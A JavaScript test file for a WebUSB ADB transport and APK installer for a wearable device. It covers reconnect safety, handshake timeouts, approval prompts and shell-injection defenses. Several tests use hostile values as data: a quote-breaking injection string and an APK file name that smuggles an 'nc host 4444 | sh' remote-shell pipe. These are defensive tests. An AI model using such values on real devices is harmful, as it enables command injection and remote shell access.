import assert from "node:assert/strict";
import test from "node:test";

/*
 * Ownership of the ONE Pin ADB session, driven rather than read.
 *
 * The Pin is physically attached to a wearer, and this transport is shared by
 * the whole browser tab: the installer, every settings pane, and the operator
 * shell all talk to the device through it. Two properties therefore have to
 * hold no matter how the session got into its current state.
 *
 *   1. A reconnect NEVER silently binds to a different device. `PinClient`
 *      object identity hangs off this transport and is what
 *      `settings/pin/_lib/useDeviceSettings.ts` uses as its per-device privacy
 *      boundary, so re-binding would read and write one wearer's device
 *      settings against another's Pin.
 *   2. Whoever observes the session is told when `adb`/`info` actually change.
 *      The transport reconnects ITSELF on a retryable socket close, so an
 *      observer bolted to a wrapper method never hears about that path and
 *      keeps reporting a device that has already been torn down.
 *
 * The real `WebUsbAdbSessionTransport` runs here. Only the two things that need
 * physical hardware are stubbed: the WebUSB device manager and the ADB
 * authentication handshake.
 */

// `src/lib/pin-device/adb/transport.ts` imports `../logging` the way the
// bundler resolves it. Node needs the extension spelled out for it.

const { AdbAuthType, AdbCommand, AdbDaemonTransport } = await import("@yume-chan/adb");
const { AdbDaemonWebUsbDeviceManager } = await import(
  "@yume-chan/adb-daemon-webusb"
);
const { Consumable } = await import("@yume-chan/stream-extra");
const { WebUsbAdbSessionTransport, pinBridgeSocketService } = await import(
  "../src/lib/pin-device/adb/transport.ts?pin-adb-session-test"
);

/**
 * A daemon transport `new Adb(...)` accepts.
 *
 * `shell_v2` is advertised so `adb.subprocess.shellProtocol` exists, and every
 * socket it then opens fails the way a yanked cable fails, "Socket closed" is
 * the exact string `recoverFromRetryableDisconnect` keys on.
 */
function fakeDaemonTransport(serial, { closeRejects = false } = {}) {
  return {
    serial,
    maxPayloadSize: 1024,
    banner: {
      product: "pin",
      model: "pin",
      device: "pin",
      features: ["shell_v2"],
    },
    disconnected: new Promise(() => {}),
    clientFeatures: ["shell_v2"],
    connect() {
      throw new Error("Socket closed");
    },
    addReverseTunnel() {},
    removeReverseTunnel() {},
    clearReverseTunnels() {},
    close() {
      return closeRejects
        ? Promise.reject(new Error("The device was disconnected."))
        : Promise.resolve();
    },
  };
}

function fakeDevice(serial, name = `Pin ${serial}`) {
  return {
    serial,
    name,
    connect: () =>
      Promise.resolve({
        writable: { close: () => Promise.resolve() },
        readable: { cancel: () => Promise.resolve() },
      }),
  };
}

const authStrategy = {
  createAuthenticationBundle: () =>
    Promise.resolve({ credentialStore: {}, authenticators: [] }),
};

/**
 * Install the two hardware stubs for the duration of `body`.
 *
 * `attached` is mutable so a test can unplug one Pin and plug in another
 * between calls, which is exactly the scenario that matters.
 */
async function withStubbedUsb(attached, body, { closeRejects = false } = {}) {
  const previousManager = AdbDaemonWebUsbDeviceManager.BROWSER;
  const previousAuthenticate = AdbDaemonTransport.authenticate;

  const requested = [];
  AdbDaemonWebUsbDeviceManager.BROWSER = {
    requestDevice: () => Promise.resolve(attached.devices[0] ?? undefined),
    getDevices: () => Promise.resolve([...attached.devices]),
  };
  AdbDaemonTransport.authenticate = ({ serial }) => {
    requested.push(serial);
    return Promise.resolve(fakeDaemonTransport(serial, { closeRejects }));
  };

  try {
    return await body({ requested });
  } finally {
    AdbDaemonWebUsbDeviceManager.BROWSER = previousManager;
    AdbDaemonTransport.authenticate = previousAuthenticate;
  }
}

test("reconnect refuses to bind a different Pin than the one that was authorized", async () => {
  const attached = { devices: [fakeDevice("PIN-A")] };
  const changes = [];

  await withStubbedUsb(attached, async ({ requested }) => {
    const session = new WebUsbAdbSessionTransport({
      authStrategy,
      onStateChange: (change) => changes.push(change),
    });

    const info = await session.connect();
    assert.equal(info.serial, "PIN-A");

    // The wearer unplugs Pin A and a second Pin is attached in its place.
    attached.devices = [fakeDevice("PIN-B")];

    await assert.rejects(
      () => session.reconnect(),
      /previously authorized Pin \(PIN-A\) is no longer attached/,
      "a reconnect that cannot find the authorized serial must fail, not adopt whatever is plugged in",
    );

    // The decisive assertion: PIN-B was never authenticated, and the session
    // does not claim to be holding anything.
    assert.deepEqual(requested, ["PIN-A"]);
    assert.equal(session.connectionInfo, null);
  });

  // ...and the observer was told, so no surface can keep rendering "Connected".
  assert.deepEqual(
    changes.map((change) => change.phase),
    ["connecting", "connected", "connecting", "error"],
  );
  assert.equal(changes.at(-1).info, null);
});

test("reconnect to the SAME Pin is observed, so derived state is rebuilt", async () => {
  const attached = { devices: [fakeDevice("PIN-A")] };
  const changes = [];

  await withStubbedUsb(attached, async ({ requested }) => {
    const session = new WebUsbAdbSessionTransport({
      authStrategy,
      onStateChange: (change) => changes.push(change),
    });

    await session.connect();
    changes.length = 0;

    const info = await session.reconnect();
    assert.equal(info.serial, "PIN-A");
    assert.deepEqual(requested, ["PIN-A", "PIN-A"]);
  });

  /*
   * `idle` must NOT appear: the teardown inside a reconnect is an
   * implementation detail of one continuous "connecting" window, and
   * publishing idle would make the console clear its device-derived state
   * mid-operation. But `connecting` must appear, because that transition is
   * the only thing that tells a consumer keyed on the (unchanged) serial that
   * the tunnel and the PinClient behind it are gone.
   */
  assert.deepEqual(
    changes.map((change) => change.phase),
    ["connecting", "connected"],
  );
});

test("a socket-closed operation recovers through the same observed path", async () => {
  const attached = { devices: [fakeDevice("PIN-A")] };
  const changes = [];

  await withStubbedUsb(attached, async () => {
    const session = new WebUsbAdbSessionTransport({
      authStrategy,
      onStateChange: (change) => changes.push(change),
    });
    await session.connect();
    changes.length = 0;

    // `shell()` fails the way a yanked cable fails. The transport reconnects
    // ITSELF here, which is the path no wrapper method ever sees.
    await assert.rejects(() => session.shell(["echo", "hi"]));
  });

  assert.deepEqual(
    changes.map((change) => change.phase),
    ["connecting", "connected"],
    "the transport's own recovery must publish, or the store keeps reporting a session that was torn down",
  );
});

test("a disconnect whose close() rejects still releases the session", async () => {
  const attached = { devices: [fakeDevice("PIN-A")] };
  const changes = [];

  await withStubbedUsb(
    attached,
    async ({ requested }) => {
      const session = new WebUsbAdbSessionTransport({
        authStrategy,
        onStateChange: (change) => changes.push(change),
      });
      await session.connect();

      // Writing to an already-unplugged device rejects. That still means this
      // transport is finished.
      await session.disconnect();
      assert.equal(session.connectionInfo, null);

      // The bug this pins: with `adb`/`info` left set, `connect()`
      // short-circuited and reported the stale serial as Connected without
      // ever touching a device.
      await session.connect();
      assert.deepEqual(
        requested,
        ["PIN-A", "PIN-A"],
        "the next connect must really re-authenticate a device",
      );
    },
    { closeRejects: true },
  );

  assert.deepEqual(
    changes.map((change) => change.phase),
    ["connecting", "connected", "idle", "connecting", "connected"],
  );
});

test("a Pin that never finishes the handshake gets a bounded, plain answer", async (t) => {
  let readableController;
  const firstConnection = {
    readable: new ReadableStream({
      start(controller) {
        readableController = controller;
      },
    }),
    writable: new Consumable.WritableStream({}),
  };
  const retryConnection = {
    readable: new ReadableStream(),
    writable: new WritableStream(),
  };
  let rawCloseCalls = 0;
  let connectCalls = 0;
  let authenticateCalls = 0;
  let handshakeSettled = false;
  const device = {
    serial: "PIN-A",
    name: "Pin PIN-A",
    raw: {
      async close() {
        rawCloseCalls += 1;
        readableController.error(new Error("WebUSB device closed"));
      },
    },
    connect: () => Promise.resolve(connectCalls++ === 0 ? firstConnection : retryConnection),
  };
  const changes = [];
  const previousManager = AdbDaemonWebUsbDeviceManager.BROWSER;
  const previousAuthenticate = AdbDaemonTransport.authenticate;
  AdbDaemonWebUsbDeviceManager.BROWSER = { requestDevice: () => Promise.resolve(device) };
  // Drive the installed authenticator on the first attempt. It owns both
  // stream locks until raw.close() faults the pending readable transfer.
  AdbDaemonTransport.authenticate = (options) => {
    authenticateCalls += 1;
    if (authenticateCalls > 1) {
      return Promise.resolve(fakeDaemonTransport(options.serial));
    }
    return previousAuthenticate(options)
      .finally(() => {
        handshakeSettled = true;
      });
  };
  t.mock.timers.enable({ apis: ["setTimeout"] });

  try {
    const session = new WebUsbAdbSessionTransport({
      authStrategy,
      onStateChange: (change) => changes.push(change),
    });
    const connecting = session.connect();
    const outcome = assert.rejects(connecting, (error) => {
      assert.equal(error.name, "AdbHandshakeTimeoutError");
      assert.match(error.message, /didn't accept the USB connection/u);
      assert.match(error.message, /Connect over USB/u);
      return true;
    });
    await new Promise((resolve) => setImmediate(resolve));
    t.mock.timers.tick(30_000);
    await outcome;
    assert.equal(session.connectionInfo, null);

    assert.equal(rawCloseCalls, 1, "timeout must close the underlying USBDevice");
    assert.equal(handshakeSettled, true, "connect must wait for authentication to release its locks");
    assert.equal(firstConnection.readable.locked, false);
    assert.equal(firstConnection.writable.locked, false);

    const retry = await session.connect();
    assert.equal(retry.serial, "PIN-A", "the released interface must reconnect normally");
  } finally {
    if (rawCloseCalls === 0) await device.raw.close();
    AdbDaemonWebUsbDeviceManager.BROWSER = previousManager;
    AdbDaemonTransport.authenticate = previousAuthenticate;
  }

  assert.deepEqual(
    changes.map((change) => change.phase),
    ["connecting", "error", "connecting", "connected"],
  );
});

test("a stalled WebUSB close cannot extend the bounded handshake answer forever", async (t) => {
  const never = new Promise(() => {});
  const device = {
    serial: "PIN-A",
    name: "Pin PIN-A",
    raw: { close: () => never },
    connect: () => Promise.resolve({
      writable: { close: () => never },
      readable: { cancel: () => never },
    }),
  };
  const changes = [];
  const previousManager = AdbDaemonWebUsbDeviceManager.BROWSER;
  const previousAuthenticate = AdbDaemonTransport.authenticate;
  AdbDaemonWebUsbDeviceManager.BROWSER = { requestDevice: () => Promise.resolve(device) };
  AdbDaemonTransport.authenticate = () => never;
  t.mock.timers.enable({ apis: ["setTimeout"] });

  let rejection;
  try {
    const session = new WebUsbAdbSessionTransport({
      authStrategy,
      onStateChange: (change) => changes.push(change),
    });
    session.connect().catch((error) => {
      rejection = error;
    });
    await new Promise((resolve) => setImmediate(resolve));
    t.mock.timers.tick(30_000);
    await Promise.resolve();
    t.mock.timers.tick(1_000);
    await new Promise((resolve) => setImmediate(resolve));

    assert.equal(rejection?.name, "AdbHandshakeTimeoutError");
    assert.equal(session.connectionInfo, null);
  } finally {
    AdbDaemonWebUsbDeviceManager.BROWSER = previousManager;
    AdbDaemonTransport.authenticate = previousAuthenticate;
  }

  assert.deepEqual(changes.map((change) => change.phase), ["connecting", "error"]);
});

/*
 * The unauthorized state.
 *
 * A factory-reset Pin that lost its stored ADB key refuses every signed token.
 * adbd then holds the offered public key pending and waits for the on-device
 * approval, the stock `UsbDebuggingActivity` prompt, and says nothing back
 * over the wire. The transport must recognize exactly that state, keep
 * re-asking (one approval request per connection) instead of answering the
 * generic handshake timeout, and only then fail with a sentence that names
 * what the wearer is waiting for.
 */
test("an unanswered public-key offer is re-asked, then named as pending approval", async (t) => {
  let rawCloseCalls = 0;
  let connectCalls = 0;
  let authenticateCalls = 0;
  let offeredKey = null;

  const device = {
    serial: "PIN-A",
    name: "Pin PIN-A",
    raw: {
      async close() {
        rawCloseCalls += 1;
      },
    },
    connect: () => {
      connectCalls += 1;
      return Promise.resolve({
        readable: new ReadableStream(),
        writable: new WritableStream(),
      });
    },
  };

  // Offers the operator public key after the second token: the real strategy's
  // shape, with the signer round trip stubbed out.
  const approvalStrategy = {
    createAuthenticationBundle: () =>
      Promise.resolve({
        credentialStore: {},
        authenticators: [
          async function* (_credentialStore, getNextRequest) {
            const first = await getNextRequest();
            assert.equal(first.arg0, AdbAuthType.Token);
            await getNextRequest(); // the signature was refused
            yield {
              command: AdbCommand.Auth,
              arg0: AdbAuthType.PublicKey,
              arg1: 0,
              payload: new TextEncoder().encode("AAAAQW5kcm9pZA== operator@luma\u0000"),
            };
          },
        ],
      }),
  };

  const previousManager = AdbDaemonWebUsbDeviceManager.BROWSER;
  const previousAuthenticate = AdbDaemonTransport.authenticate;
  AdbDaemonWebUsbDeviceManager.BROWSER = { requestDevice: () => Promise.resolve(device) };
  AdbDaemonTransport.authenticate = (options) => {
    authenticateCalls += 1;
    const settles = authenticateCalls > 3;
    // Drive the transport's wrapped authenticator so the offer is observed
    // the way a real handshake would deliver it. An unanswered offer never
    // settles. A later connection that gets approved does.
    void (async () => {
      const bundle = await approvalStrategy.createAuthenticationBundle({});
      for (const authenticator of options.authenticators) {
        const getNextRequest = () =>
          Promise.resolve({
            command: 4,
            arg0: 1,
            arg1: 0,
            payload: new Uint8Array(20),
          });
        for await (const packet of authenticator(bundle.credentialStore, getNextRequest)) {
          if (packet.arg0 === AdbAuthType.PublicKey) {
            offeredKey = new TextDecoder().decode(packet.payload).replace(/\u0000+$/u, "");
          }
        }
      }
    })();
    return settles
      ? Promise.resolve(fakeDaemonTransport(options.serial))
      : new Promise(() => {});
  };
  t.mock.timers.enable({ apis: ["setTimeout"] });

  const changes = [];
  let session;
  try {
    session = new WebUsbAdbSessionTransport({
      authStrategy: approvalStrategy,
      onStateChange: (change) => changes.push(change),
    });
    const connecting = session.connect();
    const outcome = assert.rejects(
      connecting,
      (error) => {
        assert.equal(error.name, "AdbApprovalPendingError");
        assert.match(error.message, /Allow USB debugging/u);
        return true;
      },
      "the unauthorized state must be named, not given the generic handshake answer",
    );
    for (let attempt = 0; attempt < 3; attempt += 1) {
      await new Promise((resolve) => setImmediate(resolve));
      t.mock.timers.tick(30_000); // the handshake step timeout
      await Promise.resolve();
      t.mock.timers.tick(1_000); // the cleanup timeout
      await new Promise((resolve) => setImmediate(resolve));
    }

    await outcome;
    assert.equal(offeredKey, "AAAAQW5kcm9pZA== operator@luma");
    assert.equal(
      session.lastAwaitingApprovalPublicKey,
      "AAAAQW5kcm9pZA== operator@luma",
      "the diagnostic offer stays readable after the failure",
    );
    assert.equal(session.connectionInfo, null);

    // The owner accepts the prompt (or the key lands another way). The next
    // connect succeeds without any code change.
    const info = await session.connect();
    assert.equal(info.serial, "PIN-A");
  } finally {
    AdbDaemonWebUsbDeviceManager.BROWSER = previousManager;
    AdbDaemonTransport.authenticate = previousAuthenticate;
  }

  assert.equal(authenticateCalls, 4);
  assert.equal(connectCalls, 4);
  assert.ok(rawCloseCalls >= 3, "every abandoned attempt released the WebUSB device");
  assert.deepEqual(
    changes.map((change) => change.phase),
    ["connecting", "error", "connecting", "connected"],
  );
});

/*
 * The installer's shell sinks.
 *
 * ADB has no execve-argv form: `transport.shell([...])` is joined with spaces
 * and handed to the device's shell as a STRING, so anything interpolated into
 * one is shell source. `/settings/pin/install` is an ungated wearer path whose
 * "Install APK File" flow takes a name straight from a `<input type="file">`,
 * which makes this reachable with a file someone else chose the name of.
 */
const { readdir, mkdtemp, rm } = await import("node:fs/promises");
const { execFile } = await import("node:child_process");
const { promisify } = await import("node:util");
const { join } = await import("node:path");
const runShell = promisify(execFile);

const {
  assertPackageManagerReady,
  isValidApkStagingName,
  packageHasLoadedPathForUser,
  stageSystemApkBatchInstall,
  waitForPackageUnloadedForUserZero,
  waitForPackageForUserZero,
  waitForPackageManagerReady,
  waitForStagingProviderReady,
} = await import(
  "../src/lib/pin-device/adb/systemInstaller.ts?pin-adb-session-test"
);

test("package readiness requires a real absolute package path", async () => {
  const responses = [
    { stdout: "package:not found\n", stderr: "", exitCode: 0 },
    { stdout: "package: not found\n", stderr: "", exitCode: 0 },
    {
      stdout: "package:/system/framework/framework-res.apk\n",
      stderr: "",
      exitCode: 0,
    },
  ];
  let probes = 0;
  const transport = {
    async shell(command) {
      const text = Array.isArray(command) ? command.join(" ") : command;
      assert.equal(text, "cmd package path android");
      const response = responses[Math.min(probes, responses.length - 1)];
      probes += 1;
      return response;
    },
  };

  await waitForPackageManagerReady(transport, 1_000, 0, 0);

  assert.equal(probes, 3);
});

test("package readiness timeout preserves the last response and retry guidance", async () => {
  let probes = 0;
  const transport = {
    async shell(command) {
      const text = Array.isArray(command) ? command.join(" ") : command;
      assert.equal(text, "cmd package path android");
      probes += 1;
      throw new Error("ADB shell unavailable while Android is starting");
    },
  };

  await assert.rejects(
    () => waitForPackageManagerReady(transport, 20, 1, 0),
    (error) => {
      assert.match(error.message, /Timed out after 20ms/);
      assert.match(error.message, /wait for startup to finish, then retry/i);
      assert.match(error.message, /ADB shell unavailable while Android is starting/);
      return true;
    },
  );
  assert.ok(probes > 0);
});

test("package readiness bounds a probe that never returns", async () => {
  const startedAt = Date.now();
  const transport = {
    shell() {
      return new Promise(() => undefined);
    },
  };

  await assert.rejects(
    () => waitForPackageManagerReady(transport, 20, 1, 0),
    /wait for Android package service/,
  );
  assert.ok(Date.now() - startedAt < 500);
});

test("post-install package verification survives a transient package-service loss", async () => {
  const packageName = "com.penumbraos.hook.injector";
  const responses = [
    {
      stdout: "",
      stderr: "cmd: Can't find service: package",
      exitCode: 20,
    },
    { stdout: "", stderr: "", exitCode: 0 },
    { stdout: `package:${packageName}\n`, stderr: "", exitCode: 0 },
  ];
  let probes = 0;
  const transport = {
    async shell(command) {
      assert.match(command.join(" "), /pm.*list.*packages.*--user.*0/u);
      const response = responses[Math.min(probes, responses.length - 1)];
      probes += 1;
      return response;
    },
  };

  await waitForPackageForUserZero(transport, packageName, 1_000, 0);

  assert.equal(probes, 3);
});

test("keep-data uninstall waits for a transient loaded APK path to disappear", async () => {
  const packageName = "com.penumbraos.hook";
  const responses = [
    {
      stdout: `package:/data/app/${packageName}-injected/base.apk\n`,
      stderr: "",
      exitCode: 0,
    },
    { stdout: "", stderr: "", exitCode: 0 },
  ];
  let probes = 0;
  const transport = {
    async shell(command) {
      assert.match(command.join(" "), /pm.*path.*--user.*0/u);
      const response = responses[Math.min(probes, responses.length - 1)];
      probes += 1;
      return response;
    },
  };

  await waitForPackageUnloadedForUserZero(transport, packageName, 1_000, 0);

  assert.equal(probes, 2);
});

test("an empty exit-1 package path means the user-scoped APK is unloaded", async () => {
  const packageName = "com.penumbraos.server";
  const transport = {
    async shell() {
      return { stdout: "", stderr: "", exitCode: 1 };
    },
  };

  assert.equal(
    await packageHasLoadedPathForUser(transport, packageName, 0),
    false,
  );
  await assert.rejects(
    () => packageHasLoadedPathForUser(
      {
        async shell() {
          return {
            stdout: "",
            stderr: "cmd: Can't find service: package",
            exitCode: 20,
          };
        },
      },
      packageName,
      0,
    ),
    /Can't find service: package/,
  );
});

test("the pre-mutation package assertion probes once and fails closed", async () => {
  let probes = 0;
  const transport = {
    async shell(command) {
      assert.equal(command.join(" "), "cmd package path android");
      probes += 1;
      return {
        stdout: "",
        stderr: "cmd: Can't find service: package",
        exitCode: 20,
      };
    },
  };

  await assert.rejects(
    () => assertPackageManagerReady(transport, 20),
    /No package changes were started.*Can't find service: package/,
  );
  assert.equal(probes, 1);
});

test("a hostile value in a shell sink is inert on a real shell", async () => {
  const scratch = await mkdtemp(join(import.meta.dirname, "shellq-"));
  try {
    // `authority` is a parameter of an exported function, so this drives the
    // real interpolation path rather than a copy of it.
    const hostile = `evil'; touch INJECTED ;'`;
    let line = null;
    const transport = {
      shell(command) {
        line = Array.isArray(command) ? command.join(" ") : command;
        // Answer as a ready provider so the poll returns immediately.
        return Promise.resolve({ stdout: "", stderr: "", exitCode: 0 });
      },
    };

    await waitForStagingProviderReady(transport, hostile, 1_000, 10);
    assert.ok(line, "the provider probe must have issued a command");
    assert.match(line, /^sh -c /, "an interpolated command must go through sh -c");

    // Run exactly what adbd would run. `content` does not exist here, so the
    // command fails, the point is whether the INJECTED payload also ran.
    await runShell("/bin/sh", ["-c", line], { cwd: scratch }).catch(() => undefined);
    assert.deepEqual(
      await readdir(scratch),
      [],
      "the interpolated value executed as a command on the device's shell",
    );
  } finally {
    await rm(scratch, { recursive: true, force: true });
  }
});

test("an unusable APK file name is refused before any device I/O", async () => {
  const calls = [];
  const transport = {
    shell(command) {
      calls.push(["shell", command]);
      return Promise.resolve({ stdout: "", stderr: "", exitCode: 0 });
    },
    pushFile(path) {
      calls.push(["pushFile", path]);
      return Promise.resolve();
    },
  };

  for (const name of [
    "a.apk; toybox nc host 4444 | sh ;.apk",
    "has space.apk",
    "two,names.apk",
    "no-extension",
    "../escape.apk",
  ]) {
    assert.equal(isValidApkStagingName(name), false, name);
    await assert.rejects(
      () => stageSystemApkBatchInstall(transport, [{ apk: new Blob(["x"]), name }]),
      /is not a usable APK file name/,
      name,
    );
  }

  // The whole point of rejecting at the top: nothing was pushed, nothing ran.
  assert.deepEqual(calls, []);
  assert.equal(isValidApkStagingName("luma-server-1.2.3.apk"), true);
});

test("a session can only open the Pin's own two HTTP bridges", () => {
  // The capability that replaced a free-form `createSocket(service)`. A wearer
  // pane holding a session must not be able to name `shell:`, the service the
  // operator-only PTY is built on, or anything else.
  assert.equal(
    pinBridgeSocketService({ kind: "abstract" }),
    "localabstract:penumbra_http",
  );
  assert.equal(pinBridgeSocketService({ kind: "tcp", port: 8080 }), "tcp:8080");

  for (const port of [0, -1, 65536, 1.5, Number.NaN, "8080; shell:"]) {
    assert.throws(
      () => pinBridgeSocketService({ kind: "tcp", port }),
      /out-of-range Pin port/,
      String(port),
    );
  }
});
